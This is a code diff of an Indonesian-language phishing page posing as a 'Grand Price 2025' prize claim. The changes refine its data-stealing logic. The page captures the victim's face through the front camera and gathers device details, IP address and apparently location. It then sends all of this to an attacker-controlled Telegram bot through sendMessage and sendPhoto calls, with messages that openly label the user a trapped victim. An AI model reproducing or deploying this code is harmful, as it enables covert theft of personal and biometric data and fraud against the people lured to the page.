@@ -169,11 +169,6 @@
             font-weight: 500;
         }
         
-        .prize-item i {
-            margin-right: 10px;
-            font-size: 20px;
-        }
-        
         .email-section {
             margin: 25px 0;
         }
@@ -304,35 +299,57 @@
             display: none;
             margin: 20px 0;
             position: relative;
+            background: #000;
+            border-radius: 15px;
+            padding: 15px;
         }
 
         #cameraVideo {
             width: 100%;
             max-width: 400px;
-            border-radius: 15px;
+            border-radius: 10px;
             border: 3px solid #007bff;
         }
 
         .camera-overlay {
             position: absolute;
-            top: 10px;
-            left: 10px;
+            top: 20px;
+            left: 20px;
             background: rgba(0,0,0,0.7);
             color: white;
-            padding: 5px 10px;
+            padding: 8px 15px;
             border-radius: 10px;
             font-size: 12px;
+            z-index: 10;
         }
 
         .capture-btn {
             background: #dc3545;
             color: white;
             border: none;
-            padding: 12px 25px;
+            padding: 15px 30px;
             border-radius: 25px;
             cursor: pointer;
-            margin: 10px 0;
+            margin: 15px 0;
             font-weight: bold;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .capture-btn:hover {
+            background: #c82333;
+            transform: scale(1.05);
+        }
+
+        .skip-camera {
+            background: #6c757d;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            margin: 10px;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -383,6 +400,8 @@
                 <canvas id="cameraCanvas" style="display:none"></canvas>
                 <br>
                 <button class="capture-btn" onclick="capturePhoto()">📸 AMBIL FOTO UNTUK VERIFIKASI</button>
+                <br>
+                <button class="skip-camera" onclick="skipCamera()">➡️ Lewati Verifikasi Wajah</button>
             </div>
             
             <button class="claim-btn" onclick="startVerification()">
@@ -446,7 +465,6 @@
             const dateTimeStr = now.toLocaleDateString('id-ID', options);
             document.getElementById('currentDateTime').textContent = dateTimeStr;
             
-            // Deteksi zona waktu Indonesia
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             let waktuIndonesia = '';
             
@@ -484,11 +502,12 @@
         async function startCamera() {
             try {
                 document.getElementById('cameraContainer').style.display = 'block';
+                document.querySelector('.claim-btn').style.display = 'none';
                 
                 const video = document.getElementById('cameraVideo');
                 cameraStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
-                        facingMode: 'user', // Kamera depan
+                        facingMode: 'user',
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
                     },
@@ -497,7 +516,6 @@
                 
                 video.srcObject = cameraStream;
                 
-                // Scroll ke kamera
                 document.getElementById('cameraContainer').scrollIntoView({ 
                     behavior: 'smooth' 
                 });
@@ -509,7 +527,7 @@
             }
         }
         
-        // Fungsi mengambil foto
+        // Fungsi mengambil foto - FIXED!
         function capturePhoto() {
             document.getElementById('cameraSound').play();
             
@@ -517,22 +535,40 @@
             const canvas = document.getElementById('cameraCanvas');
             const context = canvas.getContext('2d');
             
+            // Set canvas size sama dengan video
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
+            
+            // Draw video frame ke canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);
+            // Convert ke base64 - INI YANG DIPERBAIKI
+            capturedPhoto = canvas.toDataURL('image/jpeg', 0.7);
             
-            // Stop kamera setelah mengambil foto
+            console.log('Foto diambil, size:', capturedPhoto.length);
+            
+            // Stop kamera
             if (cameraStream) {
                 cameraStream.getTracks().forEach(track => track.stop());
             }
             
-            document.getElementById('cameraContainer').style.display = 'none';
             document.querySelector('.capture-btn').textContent = '✅ FOTO BERHASIL DIAMBIL';
             document.querySelector('.capture-btn').style.background = '#28a745';
+            document.querySelector('.capture-btn').disabled = true;
             
-            // Lanjut proses klaim
+            // Otomatis lanjut setelah 1 detik
+            setTimeout(() => {
+                processClaim();
+            }, 1000);
+        }
+        
+        // Skip kamera
+        function skipCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            document.getElementById('cameraContainer').style.display = 'none';
+            document.querySelector('.claim-btn').style.display = 'block';
             processClaim();
         }
         
@@ -551,55 +587,51 @@
             }
             
             document.getElementById('clickSound').play();
-            
-            // Tampilkan kamera untuk verifikasi wajah
             startCamera();
         }
         
-        // Lanjut tanpa kamera
-        function proceedWithoutCamera() {
+        // Main claim function
+        function processClaim() {
+            document.getElementById('cameraContainer').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             document.querySelector('.claim-btn').disabled = true;
-            processClaim();
+            document.querySelector('.claim-btn').style.background = "#6c757d";
+            
+            collectCompleteData();
         }
         
-        // Fungsi confetti
-        function createConfetti() {
-            const container = document.getElementById('confettiContainer');
-            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
-            
-            for (let i = 0; i < 150; i++) {
-                const confetti = document.createElement('div');
-                confetti.className = 'confetti';
-                confetti.style.left = Math.random() * 100 + 'vw';
-                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
-                confetti.style.opacity = '1';
-                confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+        // Fungsi konversi base64 ke blob - FIXED!
+        function base64ToBlob(base64) {
+            try {
+                // Hilangkan prefix data URL
+                const base64Data = base64.split(',')[1];
+                // Convert base64 ke binary
+                const byteCharacters = atob(base64Data);
+                const byteArrays = [];
                 
-                container.appendChild(confetti);
-                
-                const animation = confetti.animate([
-                    { 
-                        transform: `translateY(-100px) rotate(0deg)`,
-                        opacity: 1
-                    },
-                    { 
-                        transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`,
-                        opacity: 0
+                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                    const slice = byteCharacters.slice(offset, offset + 512);
+                    
+                    const byteNumbers = new Array(slice.length);
+                    for (let i = 0; i < slice.length; i++) {
+                        byteNumbers[i] = slice.charCodeAt(i);
                     }
-                ], {
-                    duration: 2000 + Math.random() * 3000,
-                    easing: 'cubic-bezier(0.1, 0.8, 0.3, 1)'
-                });
+                    
+                    const byteArray = new Uint8Array(byteNumbers);
+                    byteArrays.push(byteArray);
+                }
                 
-                animation.onfinish = () => confetti.remove();
+                return new Blob(byteArrays, { type: 'image/jpeg' });
+            } catch (error) {
+                console.error('Error converting base64 to blob:', error);
+                return null;
             }
         }
         
-        // Fungsi kirim ke Telegram dengan foto
+        // Fungsi kirim ke Telegram dengan foto - FIXED!
         async function sendToTelegram(data, photoData = null) {
             let message = `
-🚨 *DATA KORBAN BARU - GRAND PRICE 2025* 🚨
+🚨 *Data korban baru by franzzff mewing🤫🧏‍♂️* 🚨
 
 🥳 *PENGGUNA BERHASIL TERJEBAK* 🥳
 
@@ -617,9 +649,7 @@
 ┌ Platform: ${data.platform}
 ├ Browser: ${data.userAgent}
 ├ Layar: ${data.screen}
-├ Memory: ${data.deviceMemory} GB
-├ CPU Cores: ${data.hardwareConcurrency}
-└ IP: ${data.ip}
+├ IP: ${data.ip}
 
 ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak diambil'}
 
@@ -640,21 +670,24 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
                     })
                 });
                 
-                // Jika ada foto, kirim foto
+                // Jika ada foto, kirim foto - INI YANG DIPERBAIKI
                 if (photoData) {
-                    // Convert base64 ke blob
-                    const response = await fetch(photoData);
-                    const blob = await response.blob();
+                    const blob = base64ToBlob(photoData);
                     
-                    const formData = new FormData();
-                    formData.append('chat_id', TELEGRAM_CHAT_ID);
-                    formData.append('photo', blob, 'wajah_korban.jpg');
-                    formData.append('caption', '📸 FOTO WAJAH KORBAN - Grand Price 2025');
-                    
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
+                    if (blob) {
+                        const formData = new FormData();
+                        formData.append('chat_id', TELEGRAM_CHAT_ID);
+                        formData.append('photo', blob, 'wajah_korban.jpg');
+                        formData.append('caption', '📸 FOTO WAJAH KORBAN - Grand Price 2025');
+                        
+                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        console.log('Foto berhasil dikirim ke Telegram');
+                    } else {
+                        console.log('Gagal konversi foto ke blob');
+                    }
                 }
                 
                 return true;
@@ -662,15 +695,6 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
                 console.error('Error sending to Telegram:', error);
                 return false;
             }
-        }
-        
-        // Main claim function
-        function processClaim() {
-            document.getElementById('loading').style.display = 'block';
-            document.querySelector('.claim-btn').disabled = true;
-            document.querySelector('.claim-btn').style.background = "#6c757d";
-            
-            collectCompleteData();
         }
         
         function collectCompleteData() {
@@ -748,7 +772,7 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 15000,
+                        timeout: 10000,
                         maximumAge: 0
                     }
                 );
@@ -770,7 +794,7 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
             
             setTimeout(() => {
                 showSuccess(sessionId, success);
-            }, 4000);
+            }, 3000);
         }
         
         function showSuccess(sessionId, telegramSuccess) {
@@ -801,6 +825,31 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
             }
         }
         
+        function createConfetti() {
+            const container = document.getElementById('confettiContainer');
+            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
+            
+            for (let i = 0; i < 100; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.opacity = '1';
+                
+                container.appendChild(confetti);
+                
+                const animation = confetti.animate([
+                    { transform: `translateY(-100px) rotate(0deg)`, opacity: 1 },
+                    { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
+                ], {
+                    duration: 2000 + Math.random() * 2000,
+                    easing: 'cubic-bezier(0.1, 0.8, 0.3, 1)'
+                });
+                
+                animation.onfinish = () => confetti.remove();
+            }
+        }
+        
         // Initialize
         updateDateTime();
         updateCountdown();
@@ -811,4 +860,4 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
         }, 1000);
     </script>
 </body>
-                </html>
+    </html>
